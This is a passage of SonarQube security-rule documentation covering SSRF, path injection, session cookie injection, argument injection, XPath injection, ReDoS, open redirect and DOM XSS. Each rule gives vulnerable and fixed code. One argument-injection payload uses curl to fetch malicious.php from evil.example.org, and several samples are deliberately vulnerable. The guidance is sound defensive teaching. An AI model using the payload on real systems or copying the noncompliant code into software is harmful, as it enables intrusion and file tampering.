that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2083">
              pythonsecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Flask</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import Flask, request, send_from_directory

app &#61; Flask(&#39;example&#39;)

&#64;app.route(&#39;/example&#39;)
def example():
    my_file &#61; request.args[&#39;my_file&#39;]
    return send_file(&#34;static/%s&#34; % my_file, as_attachment&#61;True) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import Flask, request, send_from_directory

app &#61; Flask(&#39;example&#39;)

&#64;app.route(&#39;/example&#39;)
def example():
    my_file &#61; request.args[&#39;my_file&#39;]
    return send_from_directory(&#39;static&#39;, my_file)
</pre>
<h3>How does this work?</h3>
<p>The universal method to prevent path injection is to validate paths created from untrusted data. This can be done either manually or automatically,
depending on whether the library includes a data sanitization feature and the required function.</p>
<p>Here, send_from_directory can be considered a secure-by-design API.</p>
<h4>Use secure-by-design APIs</h4>
<p>Some libraries contain APIs with these three capabilities:</p>
<ul><li> File retrieval in a file system. </li><li> Restriction of the file retrieval to a specific folder (thus sanitizing and validating untrusted data). </li><li> A feature, such as a file download or file deletion. </li></ul>
<p>They can be referred to as &#34;secure-by-design&#34; APIs. Using this type of API, such as &#39;send_from_directory&#39;, brings multiple layers of security to
the code while keeping the code base shorter.</p>
<p>Behind the scenes, this function protects against both regular and partial path injection.</p>
<h3>Pitfalls</h3>
<h4>Do not use os.path.join as a validator</h4>
<p>The <a href="https://docs.python.org/3/library/os.path.html#os.path.join" rel="nofollow">official documentation</a> states that if any argument other than the
first is an absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<p>If you want to learn more about this pitfall, read <a href="https://blog.sonarsource.com/10-unknown-security-pitfalls-for-python/" rel="nofollow">our blog post
about it</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6287">
              pythonsecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a href="https://example.com?cookie&#61;injectedcookie" rel="nofollow">https://example.com?cookie&#61;injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br /> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Django</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from django.shortcuts import render

def check_cookie(request):
    response &#61; render(request, &#34;welcome.html&#34;)

    if not &#34;sessionid&#34; in request.COOKIE:
        cookie &#61; request.GET.get(&#34;cookie&#34;)
        response.set_cookie(&#34;sessionid&#34;, cookie)  # Noncompliant

    return response
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from django.http import HttpResponseRedirect
from django.shortcuts import render

def check_cookie(request):
    response &#61; render(request, &#34;welcome.html&#34;)

    if not &#34;sessionid&#34; in request.COOKIE:
        return HttpResponseRedirect(&#34;/getcookie&#34;)

    return response
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br /> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S6350">
              pythonsecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9920" rel="nofollow">CVE-2016-9920</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-29472" rel="nofollow">CVE-2021-29472</a> </li></ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Malicious arguments can result in undesired behavior in the executed command. </li><li> Passing user input to a system command is not necessary. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid constructing system commands from user input when possible. </li><li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li><li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
import subprocess
input &#61; request.get(&#39;input&#39;)
subprocess.run([&#34;/usr/bin/find&#34;, input]) # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
import subprocess
input &#61; request.get(&#39;input&#39;)
if input in allowed:
    subprocess.run([&#34;/usr/bin/find&#34;, input])
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer" rel="nofollow">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2091">
              pythonsecurity:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br /> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br /> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in lxml</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to XPath injection because untrusted data is concatenated to an XPath query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
from lxml import etree

&#64;app.route(&#39;/authenticate&#39;)
def authenticate():
    username &#61; request.args[&#39;username&#39;]
    password &#61; request.args[&#39;password&#39;]
    expression &#61; &#34;./users/user[&#64;name&#61;&#39;&#34; &#43; username &#43; &#34;&#39; and &#64;pass&#61;&#39;&#34; &#43; password &#43; &#34;&#39;]&#34;
    tree &#61; etree.parse(&#39;resources/users.xml&#39;)

    if tree.find(expression) is None:
        return &#34;Invalid credentials&#34;, 401
    else:
        return &#34;Success&#34;, 200
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
from lxml import etree

&#64;app.route(&#39;/authenticate&#39;)
def authenticate():
    username &#61; request.args[&#39;username&#39;]
    password &#61; request.args[&#39;password&#39;]
    expression &#61; &#34;./users/user[&#64;name&#61;$username and &#64;pass&#61;$password]&#34;
    tree &#61; etree.parse(&#39;resources/users.xml&#39;)

    if tree.xpath(expression, username&#61;username, password&#61;password) is None:
        return &#34;Invalid credentials&#34;, 401
    else:
        return &#34;Success&#34;, 200
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Parameterized Queries</h4>
<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>
<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath
query without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>
<pre>
/users/user[&#64;user&#61;$user and &#64;pass&#61;$pass]
</pre>
<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a
resolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath
executor, and thus injection is not possible.</p>
<p>In the example, the username and password are passed as <a href="https://lxml.de/xpathxslt.html#:~:text&#61;The%20xpath%28%29%20method%20has%20support%20for%20XPath%20variables%3A" rel="nofollow">XPath variables</a> rather than
concatenated to the XPath query. By using a parameterized query, injection is successfully prevented.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/643" rel="nofollow">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S2631">
              tssecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const express &#61; require(&#39;express&#39;);

const app &#61; express();

app.get(&#39;/lookup&#39;, (req, res) &#61;&gt; {
  const regex &#61; RegExp(req.query.regex); // Noncompliant

  if(regex.test(req.query.data)){
    res.send(&#34;It&#39;s a Match!&#34;);
  }else{
    res.send(&#34;Not a Match!&#34;);
  }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const express &#61; require(&#39;express&#39;);
const escapeStringRegexp &#61; require(&#39;escape-string-regexp&#39;);

const app &#61; express();

app.get(&#39;/lookup&#39;, (req, res) &#61;&gt; {
  const regex &#61; RegExp(escapeStringRegexp(req.query.regex));

  if(regex.test(req.query.data)){
    res.send(&#34;It&#39;s a Match!&#34;);
  }else{
    res.send(&#34;Not a Match!&#34;);
  }
})
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br /> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br />
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2" rel="nofollow">re2</a>.</p>
<p>In the compliant solution, the <code>escapeStringRegexp</code> function provided by the npm package <code>escape-string-regexp</code> escapes
metacharacters and escape sequences that could have broken the initially intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">OWASP Regular expression Denial of Service - ReDoS</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5883">
              tssecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br /> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br /> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
async function (req, res) {
    await execa.command(&#39;find /tmp/images/&#39; &#43; req.query.id); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
async function (req, res) {
    if (req.query.file &amp;&amp; req.query.file.match(/^[A-Z]&#43;$/i)) {
        await execa(&#39;find&#39;, [&#39;/tmp/images/&#39; &#43; req.query.file]);
    } else {
        await execa(&#39;find&#39;, [&#39;/tmp/images/&#39;]);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>When this is not possible, strict measures should be applied to ensure a secure implementation.</p>
<p>The proposed compliant solution makes use of the <code>execa</code> method. This one separates the command to run from the arguments passed to it.
It also ensures that all arguments passed to the executed command are properly escaped. That way, an attacker with control over a command parameter
will not be able to inject arbitrary new ones.</p>
<p>While this reduces the chances for an attacker to identify an exploitation payload, the highest security level will only be reached by adding an
additional validation layer.</p>
<p>In the current example, an attacker with control over the first parameter of the <code>find</code> command could still be able to inject special
file path characters in it. Indeed, passing <code>../../</code> string as a parameter would force the <code>find</code> command to crawl the whole
file system. This could lead to a denial of service or sensitive data exposure.</p>
<p>Here, adding a regular-expression-based validation on the user-controled value prevents this kind of issue. It ensures that the user-submitted
parameter contains a harmless value.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5146">
              tssecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url&#61;evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br /></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br /></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br /> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
server.get(&#39;/redirect&#39;, (request, response) &#61;&gt; {

   response.redirect(request.query.url); // Noncompliant
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
server.get(&#39;/redirect&#39;, (request, response) &#61;&gt; {

   if (request.query.url.startsWith(&#34;https://www.example.com/&#34;)) {
      response.redirect(request.query.url);
   }
});
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li><li> Using an allow-list approach in case the destination URLs are multiple but limited. </li><li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tssecurity:S5696">
              tssecurity:S5696
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>DOM-based cross-site scripting (XSS) occurs in a web application when its client-side logic reads user-controllable data, such as the URL, and then
uses this data in dangerous functions defined by the browser, such as <code>eval()</code>, without sanitizing it first.</p>
<p>When well-intentioned users open a link to a page vulnerable to DOM-based XSS, they are exposed to several attacks targeting their browsers.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but also arbitrary code that can
be interpreted by the user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting this vulnerability.</p>
<h4>Website defacement</h4>
<p>An attacker can use the vulnerability to change the target web application’s content as they see fit. Therefore, they might replace the website’s
original content with inappropriate content, leading to brand and reputation damage for the web application owner. It could additionally be used in
phishing campaigns, leading to the potential loss of user credentials.</p>
<h4>User impersonation</h4>
<p>When a user is logged into a web application and opens a malicious link, the attacker can steal that user’s web session and carry out unauthorized
actions on their account. If the credentials of a privileged user (such as an administrator) are stolen, the attacker might be able to compromise all
of the web application’s data.</p>
<h4>Theft of sensitive data</h4>
<p>Cross-site scripting allows an attacker to extract the application data of any user that opens their malicious link. Depending on the application,
